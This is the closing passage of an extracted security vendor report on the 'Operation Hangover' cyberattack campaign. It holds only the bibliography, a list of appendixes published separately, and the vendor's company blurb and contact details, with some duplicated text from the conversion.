compromises.Operation Hangover: Unveiling an Indian Cyberattack Infrastructure40Bibliography 1. Scumware.org. Scumware search. scumware.org. [Online] 100120132_372895a.pdf.3. Wikipedia. CME Group. Wikipedia. [Online] url WIPO. WIPO Arbitration and Mediation Center. WIPO. [Online] url Scumware.org. Scumware search. Scumware.org. [Online] url Viruswatch. Virus-sites with status changes. Clean-MX.com. [Online] url mx.com/pipermail/viruswatch/20110317/023586.html.Passive DNS data provided by ISC Security (url Hangover: Unveiling an Indian Cyberattack Infrastructure41Appendixes (available in a separate document)A. Samples extracted from Telenor intrusionB. Some related cases based on behaviour and malware similarity parameters.C. Malware string indicatorsD. Project and debug paths extracted from executablesE. Domain names connected to caseF. IP addresses connected to caseG. Sample MD5’sFounded in Norway, Norman AS is a global leader and pioneer in proactive Founded in Norway, Norman AS is a global leader and pioneer in proactive security software solutions and forensics malware tools. Powered by security software solutions and forensics malware tools. Powered by patented Norman SandBox technology, Norman AS offers Enterprise patented Norman SandBox technology, Norman AS offers Enterprise customers solutions for building defensible networks against advanced customers solutions for building defensible networks against advanced targeted attacks. Norman was established in 1984 and is headquartered in targeted attacks. Norman was established in 1984 and is headquartered in Norway with continental Europe, UK an d US as its main markets Norway with continental Europe, UK an d US as its main marketsContact Us: Contact Us:Norman Shark Norman Shark 1855 1st Avenue, Suite 201 1855 1st Avenue, Suite 201 San Diego, CA 92101 USA San Diego, CA 92101 USA1-888-GO-NORMAN 1-888-GO-NORMAN url url Hangover: Unveiling an Indian Cyberattack Infrastructure42 